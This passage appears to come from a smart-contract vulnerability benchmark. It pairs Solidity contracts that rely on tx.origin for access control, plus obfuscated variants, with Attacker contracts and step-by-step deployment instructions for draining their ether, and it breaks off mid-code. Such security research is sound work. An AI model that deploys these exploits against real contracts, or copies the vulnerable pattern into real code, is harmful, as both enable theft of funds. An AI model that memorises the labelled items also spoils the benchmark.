 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */

 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner);
        _recipient.transfer(this.balance);
    }
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Phishable(_victim).withdrawAll(attacker);
    }
    function () public payable{}
}
```



1. deploy contract `Phishable` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 2. phishable_confuse&Ox99fadf393d7057b9c32f495a906f4b5493c96c77

#### Source Code

```solidity
pragma solidity ^0.4.22;

contract Ox735a1689a6fa0225b6cfb6eb2b87727e839dbeff {
    constructor(address Oxf3dadfd8deeefb41a4bfc0fd458e452ba953fb8c) {
        Ox6bbf48cec4c0962bbb85985c5288dddbb289c731
            .Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65 = Oxf3dadfd8deeefb41a4bfc0fd458e452ba953fb8c;
    }

    function() public payable {}

    function Ox99fadf393d7057b9c32f495a906f4b5493c96c77(
        address Ox4a126d9ee914334df7722416120d988d327904fd
    ) public {
        require(
            tx.origin ==
                Ox6bbf48cec4c0962bbb85985c5288dddbb289c731
                    .Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65
        );
        Ox4a126d9ee914334df7722416120d988d327904fd.transfer(this.balance);
    }

    struct scalar2Vector {
        address Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65;
    }
    scalar2Vector Ox6bbf48cec4c0962bbb85985c5288dddbb289c731 =
        scalar2Vector(address(0));
}

```



#### Exploit (payable)

```solidity
pragma solidity ^0.4.22;

contract Ox735a1689a6fa0225b6cfb6eb2b87727e839dbeff {
    constructor(address Oxf3dadfd8deeefb41a4bfc0fd458e452ba953fb8c) {
        Ox6bbf48cec4c0962bbb85985c5288dddbb289c731
            .Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65 = Oxf3dadfd8deeefb41a4bfc0fd458e452ba953fb8c;
    }

    function() public payable {}

    function Ox99fadf393d7057b9c32f495a906f4b5493c96c77(
        address Ox4a126d9ee914334df7722416120d988d327904fd
    ) public {
        require(
            tx.origin ==
                Ox6bbf48cec4c0962bbb85985c5288dddbb289c731
                    .Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65
        );
        Ox4a126d9ee914334df7722416120d988d327904fd.transfer(this.balance);
    }

    struct scalar2Vector {
        address Ox361e91a892ddfb4da8b4e4f0aaccc16d165c2a65;
    }
    scalar2Vector Ox6bbf48cec4c0962bbb85985c5288dddbb289c731 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Ox735a1689a6fa0225b6cfb6eb2b87727e839dbeff(_victim).Ox99fadf393d7057b9c32f495a906f4b5493c96c77(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Ox735a1689a6fa0225b6cfb6eb2b87727e839dbeff` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 3. phishable.sol_confuse&Ox9b1b08cba67a2c9c6378a0ea4aea85a58c3240ff

#### Source Code

```javascript
pragma solidity ^0.4.22;

contract Ox514ebff829ac5d3007a064ab6c3f3ec53897fc05 {
    constructor(address Oxbbd26f003892ee7891fb392a6a858abc5fdf391b) public {
        Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326
            .Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0 = Oxbbd26f003892ee7891fb392a6a858abc5fdf391b;
    }

    function() public payable {}

    function Ox9b1b08cba67a2c9c6378a0ea4aea85a58c3240ff(
        address Oxf07747d0ab6b2f128077871b302018255bb45946
    ) public {
        uint Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 = 5 * 7 + 9 - 1 - 42;
        while (
            Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 != 7 * 7 - (4 - 2) - 47
        ) {
            if (
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 ==
                5 * (6 * 9 * 1) - 269
            ) /*ACCESS_CONTROL*/ {
                require(
                    tx.origin ==
                        Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326
                            .Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0
                );
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 =
                    6 +
                    1 +
                    (6 * 7) -
                    47;
            } else if (
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 == 7 * 9 + 3 - 1 - 63
            ) {
                Oxf07747d0ab6b2f128077871b302018255bb45946.transfer(
                    this.balance
                );
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 = 3 + 8 + 7 * 7 - 60;
            }
        }
    }

    function Oxdbb6604dc1d09c9cd6b82375571c6b6244dfbf43(
        uint256 Oxb1ea35e48b608495f0ba4374ad5b95266b5bf60f
    ) internal view returns (uint256) {
        return
            Ox2f1301f521c199435b0a247edddd51b9ff0561e7[
                Oxb1ea35e48b608495f0ba4374ad5b95266b5bf60f
            ];
    }

    uint256[] public Ox2f1301f521c199435b0a247edddd51b9ff0561e7 = [
        5 + (4 + 4) + 1 - 13,
        (7 + 0) + 4 * 3 - 17,
        5 + 3 * 9 * 5 - 140
    ];
    struct scalar2Vector {
        address Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0;
    }
    scalar2Vector Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326 =
        scalar2Vector(address(0));
}

```

#### Exploit (payable)

```javascript
pragma solidity ^0.4.22;

contract Ox514ebff829ac5d3007a064ab6c3f3ec53897fc05 {
    constructor(address Oxbbd26f003892ee7891fb392a6a858abc5fdf391b) public {
        Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326
            .Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0 = Oxbbd26f003892ee7891fb392a6a858abc5fdf391b;
    }

    function() public payable {}

    function Ox9b1b08cba67a2c9c6378a0ea4aea85a58c3240ff(
        address Oxf07747d0ab6b2f128077871b302018255bb45946
    ) public {
        uint Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 = 5 * 7 + 9 - 1 - 42;
        while (
            Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 != 7 * 7 - (4 - 2) - 47
        ) {
            if (
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 ==
                5 * (6 * 9 * 1) - 269
            ) /*ACCESS_CONTROL*/ {
                require(
                    tx.origin ==
                        Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326
                            .Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0
                );
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 =
                    6 +
                    1 +
                    (6 * 7) -
                    47;
            } else if (
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 == 7 * 9 + 3 - 1 - 63
            ) {
                Oxf07747d0ab6b2f128077871b302018255bb45946.transfer(
                    this.balance
                );
                Oxc86b25beb1b5b1bda3fb27d659a0ac02b628b376 = 3 + 8 + 7 * 7 - 60;
            }
        }
    }

    function Oxdbb6604dc1d09c9cd6b82375571c6b6244dfbf43(
        uint256 Oxb1ea35e48b608495f0ba4374ad5b95266b5bf60f
    ) internal view returns (uint256) {
        return
            Ox2f1301f521c199435b0a247edddd51b9ff0561e7[
                Oxb1ea35e48b608495f0ba4374ad5b95266b5bf60f
            ];
    }

    uint256[] public Ox2f1301f521c199435b0a247edddd51b9ff0561e7 = [
        5 + (4 + 4) + 1 - 13,
        (7 + 0) + 4 * 3 - 17,
        5 + 3 * 9 * 5 - 140
    ];
    struct scalar2Vector {
        address Oxe47c6f7cdaec3aa6ca15b8518d73bdfeedc877c0;
    }
    scalar2Vector Ox3c53a0cbc5e08d0eb79a9d0f70e3d4a0839d1326 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Ox514ebff829ac5d3007a064ab6c3f3ec53897fc05(_victim).Ox9b1b08cba67a2c9c6378a0ea4aea85a58c3240ff(attacker);
    }
    function () public payable{}
}
```



1. deploy contract `Ox514ebff829ac5d3007a064ab6c3f3ec53897fc05` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 4. phishable_variant_1&variantWithdrawAll

#### Source Code

```javascript
/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */

 pragma solidity ^0.4.22;

 contract Phishable {
    address public variantAddress;

    constructor (address _owner) {
        variantAddress = _owner;
    }

    function () public payable {} // collect ether

    function variantWithdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == variantAddress);
        _recipient.transfer(this.balance);
    }
}

```

#### Exploit (payable)

```javascript
 pragma solidity ^0.4.22;

 contract Phishable {
    address public variantAddress;

    constructor (address _owner) {
        variantAddress = _owner;
    }

    function () public payable {} // collect ether

    function variantWithdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == variantAddress);
        _recipient.transfer(this.balance);
    }
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Phishable(_victim).variantWithdrawAll(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Phishable` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 5. phishable_variant_1_confuse&Oxc7771813a253097a5c4aa43bb3751e5be949ac37

#### Source Code

```javascript
pragma solidity ^0.4.22;

contract Oxb3905fa7198fef4af368452616dcb1294e321538 {
    constructor(address Ox77a58f01fb17b4afe08bed4aadab4bd5f03f7710) {
        Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc
            .Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76 = Ox77a58f01fb17b4afe08bed4aadab4bd5f03f7710;
    }

    function() public payable {}

    function Oxc7771813a253097a5c4aa43bb3751e5be949ac37(
        address Oxd017dba784a1eba690ec6aff30e142de0c30672c
    ) public {
        require(
            tx.origin ==
                Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc
                    .Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76
        );
        Oxd017dba784a1eba690ec6aff30e142de0c30672c.transfer(this.balance);
    }

    struct scalar2Vector {
        address Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76;
    }
    scalar2Vector Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc =
        scalar2Vector(address(0));
}

```



#### Exploit (payable)

```javascript
pragma solidity ^0.4.22;

contract Oxb3905fa7198fef4af368452616dcb1294e321538 {
    constructor(address Ox77a58f01fb17b4afe08bed4aadab4bd5f03f7710) {
        Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc
            .Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76 = Ox77a58f01fb17b4afe08bed4aadab4bd5f03f7710;
    }

    function() public payable {}

    function Oxc7771813a253097a5c4aa43bb3751e5be949ac37(
        address Oxd017dba784a1eba690ec6aff30e142de0c30672c
    ) public {
        require(
            tx.origin ==
                Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc
                    .Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76
        );
        Oxd017dba784a1eba690ec6aff30e142de0c30672c.transfer(this.balance);
    }

    struct scalar2Vector {
        address Ox34d0936df5cc54ce899b58b4b8353bdf1fac8e76;
    }
    scalar2Vector Ox176df5bc3aa9b46d66b28085feaec995f0e2bbbc =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Oxb3905fa7198fef4af368452616dcb1294e321538(_victim).Oxc7771813a253097a5c4aa43bb3751e5be949ac37(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Oxb3905fa7198fef4af368452616dcb1294e321538` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether





### 6. phishable_variant_2&withdrawAll

#### Source Code

```javascript
/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */

 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        if(tx.origin == owner){
            _recipient.transfer(this.balance);
        }
    }
}

```



#### Exploit (payable)

```javascript
 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        // <yes> <report> ACCESS_CONTROL
        if(tx.origin == owner){
            _recipient.transfer(this.balance);
        }
    }
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Phishable(_victim).withdrawAll(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Phishable` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 7. phishable_variant_2_confuse&Oxd5984abc60a206d5fb5d1a4990f35534f264c9c6

#### Source Code

```javascript
pragma solidity ^0.4.22;

contract Oxbc6a1023040dbe4e1023c9f5cde1d50905fc91f8 {
    constructor(address Ox347c4506a2d3a31617c85a3b3ac646660a7e6047) {
        Oxfbd6710d44cecdba372ad25a97647d2856a33371
            .Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86 = Ox347c4506a2d3a31617c85a3b3ac646660a7e6047;
    }

    function() public payable {}

    function Oxd5984abc60a206d5fb5d1a4990f35534f264c9c6(
        address Ox9d8850808e7c5e319c275dd71bd26d626c108bd7
    ) public {
        if (
            tx.origin ==
            Oxfbd6710d44cecdba372ad25a97647d2856a33371
                .Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86
        ) {
            Ox9d8850808e7c5e319c275dd71bd26d626c108bd7.transfer(this.balance);
        }
    }

    struct scalar2Vector {
        address Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86;
    }
    scalar2Vector Oxfbd6710d44cecdba372ad25a97647d2856a33371 =
        scalar2Vector(address(0));
}

```



#### Exploit (payable)

```javascript
pragma solidity ^0.4.22;

contract Oxbc6a1023040dbe4e1023c9f5cde1d50905fc91f8 {
    constructor(address Ox347c4506a2d3a31617c85a3b3ac646660a7e6047) {
        Oxfbd6710d44cecdba372ad25a97647d2856a33371
            .Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86 = Ox347c4506a2d3a31617c85a3b3ac646660a7e6047;
    }

    function() public payable {}

    function Oxd5984abc60a206d5fb5d1a4990f35534f264c9c6(
        address Ox9d8850808e7c5e319c275dd71bd26d626c108bd7
    ) public {
        if (
            tx.origin ==
            Oxfbd6710d44cecdba372ad25a97647d2856a33371
                .Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86
        ) {
            Ox9d8850808e7c5e319c275dd71bd26d626c108bd7.transfer(this.balance);
        }
    }

    struct scalar2Vector {
        address Ox0a3dc32093676fdf193c8bf4810d4bda6cd09f86;
    }
    scalar2Vector Oxfbd6710d44cecdba372ad25a97647d2856a33371 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Oxbc6a1023040dbe4e1023c9f5cde1d50905fc91f8(_victim).Oxd5984abc60a206d5fb5d1a4990f35534f264c9c6(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Oxbc6a1023040dbe4e1023c9f5cde1d50905fc91f8` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 8. phishable_variant_3&withdrawAll

#### Source Code

```javascript
	/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 20
 */

 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    modifier onlyOwner() {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner,"Not owner");
        _;
    }

    function withdrawAll(address _recipient) public onlyOwner{
        _recipient.transfer(this.balance);
    }
}

```



#### Exploit (payable)

```javascript
 pragma solidity ^0.4.22;

 contract Phishable {
    address public owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    modifier onlyOwner() {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner,"Not owner");
        _;
    }

    function withdrawAll(address _recipient) public onlyOwner{
        _recipient.transfer(this.balance);
    }
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Phishable(_victim).withdrawAll(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Phishable` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 9. phishable_variant_3_confuse&Ox25b8466d602067ea97e4b7d8673a20280337e88d

#### Source Code

```javascript
pragma solidity ^0.4.22;

contract Ox5a6e829eb6707317d977c60b2eab4abcf50d2d2a {
    constructor(address Ox3c01f79cd7760760bb57ec7657b72c54dedb0815) {
        Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6
            .Oxeced6978dd486ec9063180a926a7747d53f721cc = Ox3c01f79cd7760760bb57ec7657b72c54dedb0815;
    }

    function() public payable {}

    modifier Oxf980ab61a141881f6aecc4d94ec17be1a0352eb2() {
        require(
            tx.origin ==
                Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6
                    .Oxeced6978dd486ec9063180a926a7747d53f721cc,
            Ox51a47f3c44e822463db838be5d7c968ae0ebb79b(8 + 4 + 4 * 4 - 28)
        );
        _;
    }

    function Ox25b8466d602067ea97e4b7d8673a20280337e88d(
        address Ox10f14bfa32dac9a40fe77fb0a8e50e2096e2ed61
    ) public Oxf980ab61a141881f6aecc4d94ec17be1a0352eb2 {
        Ox10f14bfa32dac9a40fe77fb0a8e50e2096e2ed61.transfer(this.balance);
    }

    function Ox51a47f3c44e822463db838be5d7c968ae0ebb79b(
        uint256 Ox6f19ea54f25db617010918facf641c8988c32195
    ) internal view returns (string storage) {
        return
            Ox4cd7c3be1c2846bef93ed2c7bfc48ee56db7d2df[
                Ox6f19ea54f25db617010918facf641c8988c32195
            ];
    }

    string[] public Ox4cd7c3be1c2846bef93ed2c7bfc48ee56db7d2df = [
        "Not Oxeced6978dd486ec9063180a926a7747d53f721cc"
    ];
    struct scalar2Vector {
        address Oxeced6978dd486ec9063180a926a7747d53f721cc;
    }
    scalar2Vector Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6 =
        scalar2Vector(address(0));
}

```



#### Exploit (payable)

```javascript
pragma solidity ^0.4.22;

contract Ox5a6e829eb6707317d977c60b2eab4abcf50d2d2a {
    constructor(address Ox3c01f79cd7760760bb57ec7657b72c54dedb0815) {
        Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6
            .Oxeced6978dd486ec9063180a926a7747d53f721cc = Ox3c01f79cd7760760bb57ec7657b72c54dedb0815;
    }

    function() public payable {}

    modifier Oxf980ab61a141881f6aecc4d94ec17be1a0352eb2() {
        require(
            tx.origin ==
                Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6
                    .Oxeced6978dd486ec9063180a926a7747d53f721cc,
            Ox51a47f3c44e822463db838be5d7c968ae0ebb79b(8 + 4 + 4 * 4 - 28)
        );
        _;
    }

    function Ox25b8466d602067ea97e4b7d8673a20280337e88d(
        address Ox10f14bfa32dac9a40fe77fb0a8e50e2096e2ed61
    ) public Oxf980ab61a141881f6aecc4d94ec17be1a0352eb2 {
        Ox10f14bfa32dac9a40fe77fb0a8e50e2096e2ed61.transfer(this.balance);
    }

    function Ox51a47f3c44e822463db838be5d7c968ae0ebb79b(
        uint256 Ox6f19ea54f25db617010918facf641c8988c32195
    ) internal view returns (string storage) {
        return
            Ox4cd7c3be1c2846bef93ed2c7bfc48ee56db7d2df[
                Ox6f19ea54f25db617010918facf641c8988c32195
            ];
    }

    string[] public Ox4cd7c3be1c2846bef93ed2c7bfc48ee56db7d2df = [
        "Not Oxeced6978dd486ec9063180a926a7747d53f721cc"
    ];
    struct scalar2Vector {
        address Oxeced6978dd486ec9063180a926a7747d53f721cc;
    }
    scalar2Vector Oxf6d89bb05cb39c91f122ee7aa925bf07306c0dc6 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Ox5a6e829eb6707317d977c60b2eab4abcf50d2d2a(_victim).Ox25b8466d602067ea97e4b7d8673a20280337e88d(attacker);
    }
    function () public payable{}
}
```

1. deploy contract `Ox5a6e829eb6707317d977c60b2eab4abcf50d2d2a` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`, then get contract address `0x8431717927C4a3343bCf1626e7B5B1D31E240406` [change]
2. call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x8431717927C4a3343bCf1626e7B5B1D31E240406`(victim contract address)[change]
5. attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 10. mycontract&sendTo

#### Source Code

```javascript
/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence  
 * Modified by Gerhard Wagner
 * @Labeled: [19]
 */

pragma solidity 0.4.26;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        require(tx.origin == owner);
        receiver.transfer(amount);
    }

}
```

#### Exploit

```javascript
/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence  
 * Modified by Gerhard Wagner
 * @Labeled: [19]
 */

pragma solidity 0.4.26;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        require(tx.origin == owner);
        receiver.transfer(amount);
    }

}


contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        MyContract(_victim).sendTo(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `MyContract` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 11. mycontract_confuse&Ox2d6efb91e5366a7152910796a19a91d42a13693d

#### Source Code

```solidity
pragma solidity ^0.4.24;

contract Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c {
    function Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c() public {
        Ox18dfdecc51017a829a2ae1032f70ecf81a13d131
            .Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4 = msg.sender;
    }

    function Ox2d6efb91e5366a7152910796a19a91d42a13693d(
        address Ox6907558a9e25e650210dc74bd0d6cd01d9bcf5a4,
        uint Ox6333ec7ded6005733d60d9cea4592ea5bd3d861d
    ) public {
        require(
            tx.origin ==
                Ox18dfdecc51017a829a2ae1032f70ecf81a13d131
                    .Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4
        );
        Ox6907558a9e25e650210dc74bd0d6cd01d9bcf5a4.transfer(
            Ox6333ec7ded6005733d60d9cea4592ea5bd3d861d
        );
    }

    struct scalar2Vector {
        address Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4;
    }
    scalar2Vector Ox18dfdecc51017a829a2ae1032f70ecf81a13d131 =
        scalar2Vector(address(0));
}

```



#### Exploit

```solidity
pragma solidity ^0.4.24;

contract Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c {
    function Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c() public {
        Ox18dfdecc51017a829a2ae1032f70ecf81a13d131
